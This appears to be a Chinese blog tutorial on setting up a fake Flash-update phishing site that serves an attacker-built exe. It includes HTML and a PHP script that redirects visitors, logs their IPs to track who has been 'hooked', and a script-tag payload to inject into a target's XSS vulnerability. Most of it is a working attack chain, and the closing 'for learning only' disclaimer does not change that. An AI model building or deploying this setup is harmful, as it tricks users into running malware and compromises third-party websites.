# 原版的无法实现自动收杆的效果，就简单改了一下

**好了，正文开始**

需要准备好的东西：域名、一台服务器、弹窗源码、鱼站源码以及做好的exe文件

## 第一步：在服务器上已经配置好NGINX+PHP的环境

省略步骤......


## 第二步：上传鱼站和制作好的exe文件
随便找个鱼站放上去

这里我使用的是x0rz4师傅开源的代码：`https://github.com/x0rz4/Flash_fishing`
然后打开index.html 将所有包含`www.flash.cn`的外链都删了(因为懒)，这样随便点也不会跳转到官方网站了(随意,你想怎么改都行)

最关键的是如何让下载的文件是你制作的, 就是后面的步骤了
修改`/config/flashVersion`这个文件基本上所有下载地址都在这里了，建议全部换成你的域名


创建一个目录`/cdm/latest/`, 这个路径是上面flashVersion中写的路径，用来防止exe文件

## 第三步：上传xss.html弹窗调用页面
主要用于后面的xss
```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <script src='./flash.js'></script>
    </head>
    <body>
    </body>
</html>
```
## 第四步：上传弹窗代码

可以看到上面调用了 `flash.js`,我使用的是r00tSe7en师傅的开源弹窗代码：`https://github.com/r00tSe7en/Flash-Pop` , 因此在你上传这个flash.js

接着修改这个JS，搜索`onclick=window.location.href='https://www.se7ensec.cn/'>`  全JS代码只有这么一个

把这个域名更换成鱼站的地址127.0.0.1

## 第五步：上传收杆检测代码

xss1.php
```
<!-- xss.php的改版 -->
<?php
$xssPayload =  "window.location.href=\"https://127.0.0.1/xss.html\";";
$db = "botIPs.txt";

$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
$botIP = @$_GET['ip'];

/**
1、获取IP
2、判断是否存在对应文件
3、读取里面的内容
*/
// var_dump($_REQUEST);
// var_dump($_SERVER);
if(! $_REQUEST['ip']){
    $ip_content = file_get_contents($db);
    $ip_array = explode(PHP_EOL,$ip_content);
    if(! in_array(base64_encode($ip),$ip_array)){
		header('Content-type: text/javascript');
		echo $xssPayload;
    }
}else{
    if (!is_null($botIP)){
    	file_put_contents($db,base64_encode($botIP).PHP_EOL,FILE_APPEND);
    }
}
?>
```

## 第六步：插入目标

在目标xss漏洞存在的地方插入`<script type="text/javascript" src="https://127.0.0.1/xss.php"></script>`

**姜太公钓鱼，愿者上钩**

# 总结

当所有的东西都配置完成后，你会发现毫无卵用，只要不是傻子一看就能看出来。

那为什么还要写呢? 纯属学习娱乐，原作者的自动收杆没整明白哪一步出了问题导致没复现出来，所以取个巧体验体验自动收杆的感觉。

因此切莫用于实战，否则你将每天过着规律的生活作息，吃着丰盛的美食以及做着充足的劳动。
所谓在规律中改造，秩序中生活，在潜移默化中重塑自我，在积极改造的路上奔向新生，迎接希望！！！
